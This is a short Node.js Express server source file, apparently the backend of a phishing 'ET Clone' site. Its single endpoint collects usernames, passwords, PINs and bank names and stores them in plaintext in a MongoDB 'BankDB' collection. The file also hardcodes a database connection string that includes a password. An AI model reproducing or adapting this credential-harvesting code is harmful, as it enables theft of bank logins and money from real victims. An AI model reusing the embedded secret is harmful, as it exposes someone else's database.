const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const { MongoClient } = require("mongodb");

const app = express();

// Use environment variables for sensitive information
const PORT = process.env.PORT || 3002; // Use the Render-provided port or default to 3002
const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://emily:0505Maor2005@et-clone-live.vapnp4e.mongodb.net/?retryWrites=true&w=majority&appName=ET-Clone-Live";

const client = new MongoClient(MONGO_URI);
let db;

async function connectToDatabase() {
    try {
        await client.connect();
        db = client.db("BankDB"); // Database name: BankDB
        console.log("Connected to MongoDB");
    } catch (err) {
        console.error("MongoDB connection error:", err.message);
        process.exit(1);
    }
}

connectToDatabase();

// Middleware
app.use(bodyParser.json());
app.use(cors()); // Enable CORS

// Root route to serve a message (optional)
app.get("/", (req, res) => {
    res.send("Welcome to the ET Clone API");
});

// API Endpoint to Store User Data
app.post("/store-user", async (req, res) => {
    const { username, password, pin, bankName } = req.body;

    if (!username || !password || !pin || !bankName) {
        return res.status(400).send("All fields (username, password, pin, bankName) are required.");
    }

    try {
        const usersCollection = db.collection("Users"); // Collection name: Users
        await usersCollection.insertOne({
            username,
            password,
            pin,
            bankName, // Save bank name
            createdAt: new Date(),
        });
        res.status(201).send("User data saved successfully!");
    } catch (error) {
        console.error("Error storing user data:", error.message);
        res.status(500).send("Internal server error.");
    }
});

// Start the Server
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
